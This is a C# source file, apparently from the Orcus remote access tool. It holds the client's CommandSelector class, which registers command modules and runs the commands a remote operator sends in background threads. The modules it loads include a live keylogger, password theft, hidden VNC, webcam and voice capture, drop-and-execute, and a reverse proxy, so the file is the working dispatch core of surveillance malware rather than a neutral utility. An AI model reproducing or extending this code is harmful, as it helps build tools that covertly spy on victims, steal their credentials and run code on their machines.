using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using Orcus.Commands.ActiveConnections;
using Orcus.Commands.Audio;
using Orcus.Commands.AudioVolumeControl;
using Orcus.Commands.ClientCommands;
using Orcus.Commands.ClipboardManager;
using Orcus.Commands.Code;
using Orcus.Commands.ComputerInformation;
using Orcus.Commands.ConnectionInitializer;
using Orcus.Commands.Console;
using Orcus.Commands.DeviceManager;
using Orcus.Commands.DropAndExecute;
using Orcus.Commands.EventLog;
using Orcus.Commands.FileExplorer;
using Orcus.Commands.FunActions;
using Orcus.Commands.HiddenApplication;
using Orcus.Commands.HVNC;
using Orcus.Commands.LiveKeylogger;
using Orcus.Commands.LivePerformance;
using Orcus.Commands.MessageBox;
using Orcus.Commands.Passwords;
using Orcus.Commands.RegistryExplorer;
using Orcus.Commands.RemoteDesktop;
using Orcus.Commands.ReverseProxy;
using Orcus.Commands.StartupManager;
using Orcus.Commands.SystemRestore;
using Orcus.Commands.TaskManager;
using Orcus.Commands.TextChat;
using Orcus.Commands.UninstallPrograms;
using Orcus.Commands.UserInteraction;
using Orcus.Commands.VoiceChat;
using Orcus.Commands.Webcam;
using Orcus.Commands.WindowManager;
using Orcus.Commands.WindowsCustomizer;
using Orcus.Commands.WindowsDrivers;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Utilities;

namespace Orcus.CommandManagement
{
    public class CommandSelector : IDisposable
    {
        private readonly object _selectorLock = new object();
        private readonly Dictionary<Command, object> _lockObjects;
        private readonly Dictionary<Command, CommandSettings> _commandSettings;

        public CommandSelector()
        {
            CommandCollection = new List<Command>
            {
                new ConsoleCommand(),
                new FunActionsCommand(),
                new ComputerInformation(),
                new TaskmanagerCommand(),
                new PasswordsCommand(),
                new FileExplorerCommand(),
                new RemoteDesktopCommand(),
                new MessageBoxCommand(),
                new AudioCommand(),
                new CodeCommand(),
                new RegistryCommand(),
                new ActiveConnectionsCommand(),
                new UninstallProgramsCommand(),
                new EventLogCommand(),
                new ReverseProxyCommand(),
                new WebcamCommand(),
                new AudioVolumeControlCommand(),
                new LivePerformanceCommand(),
                new TextChatCommand(),
                new UserInteractionCommand(),
#if DEBUG
                new HvncCommand(),
#endif
                new LiveKeyloggerCommand(),
                new HiddenApplicationCommand(),
                new StartupManagerCommand(),
                new WindowsCustomizerCommand(),
                new SystemRestoreCommand(),
                new WindowManagerCommand(),
                new DeviceManagerCommand(),
                new ClientCommandsCommand(),
                new ConnectionInitializerCommand(),
                new VoiceChatCommand(),
                new WindowsDriversCommand(),
                new DropAndExecuteCommand(),
                new ClipboardManagerCommand()
            };

            foreach (var command in PluginLoader.Current.Commands)
                CommandCollection.Add((Command) Activator.CreateInstance(command));

            foreach (var factoryCommandPlugin in PluginLoader.Current.FactoryCommandPlugins)
            {
                var plugin = (FactoryCommand) Activator.CreateInstance(factoryCommandPlugin.FactoryCommandType);
                plugin.Initialize(factoryCommandPlugin.Factory);
                CommandCollection.Add(plugin);
            }

            //remove duplicated commands. Important, else ToDictionary() below will fail
            CommandCollection = CommandCollection.Distinct(new CommandComparer()).ToList();

            PluginLoader.Current.CommandLoaded += Current_CommandLoaded;
            CommandDictionary = CommandCollection.ToDictionary(x => x.Identifier, y => y);
            _lockObjects = new Dictionary<Command, object>();
            _commandSettings = new Dictionary<Command, CommandSettings>();
        }

        public void Dispose()
        {
            CommandCollection.ForEach(x =>
            {
                try
                {
                    x.Dispose();
                }
                catch (Exception)
                {
                    // ignored
                }
            });
        }

        public List<Command> CommandCollection { get; }
        public Dictionary<uint, Command> CommandDictionary { get; }

        private void Current_CommandLoaded(object sender, CommandLoadedEventArgs e)
        {
            var command = (Command) Activator.CreateInstance(e.NewCommandType);
            CommandCollection.Add(command);
            CommandDictionary.Add(command.Identifier, command);
        }

        public void ExecuteCommand(uint id, byte[] parameter, ConnectionInfo connectionInfo)
        {
            lock (_selectorLock)
            {
                Command command;
                if (CommandDictionary.TryGetValue(id, out command))
                {
                    var commandSettings = GetCommandSettings(command);
                    if (!commandSettings.AllowMultipleThreads)
                    {
                        using (var autoResetEventHandler = new AutoResetEvent(false))
                        {
                            object lockObject;
                            if (!_lockObjects.TryGetValue(command, out lockObject))
                                _lockObjects.Add(command, lockObject = new object());

                            new Thread(() =>
                            {
                                try
                                {
                                    lock (lockObject)
                                    {
                                        autoResetEventHandler.Set();
                                        command.ProcessCommand(parameter, connectionInfo);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    ErrorReporter.Current.ReportError(ex,
                                        $"Occurred while executing command \"{command.GetType()}\" (Command ID: {id})");
                                    try
                                    {
                                        connectionInfo.Response(Encoding.UTF8.GetBytes(ex.Message),
                                            ResponseType.CommandError);
                                    }
                                    catch (Exception)
                                    {
                                        //FUCK IT
                                    }
                                }
                            }).Start();
                            autoResetEventHandler.WaitOne(); //Wait until the command is locked
                        }
                    }
                    else
                        new Thread(() =>
                        {
                            try
                            {
                                command.ProcessCommand(parameter, connectionInfo);
                            }
                            catch (Exception ex)
                            {
                                ErrorReporter.Current.ReportError(ex,
                                    $"Occurred while executing command \"{command.GetType()}\" (Command ID: {id})");
                                try
                                {
                                    connectionInfo.Response(Encoding.UTF8.GetBytes(ex.Message), ResponseType.CommandError);
                                }
                                catch (Exception)
                                {
                                    //FUCK IT
                                }
                            }
                        }).Start();
                }
                else
                {
                    connectionInfo.Response(BitConverter.GetBytes(id), ResponseType.CommandNotFound);
                }
            }
        }

        private CommandSettings GetCommandSettings(Command command)
        {
            CommandSettings commandSettings;
            if (!_commandSettings.TryGetValue(command, out commandSettings))
            {
                commandSettings = new CommandSettings();
                var attributes = command.GetType().GetCustomAttributes(true);
                commandSettings.AllowMultipleThreads =
                    attributes.FirstOrDefault(x => x is DisallowMultipleThreadsAttribute) == null;
                _commandSettings.Add(command, commandSettings);
            }

            return commandSettings;
        }
    }
}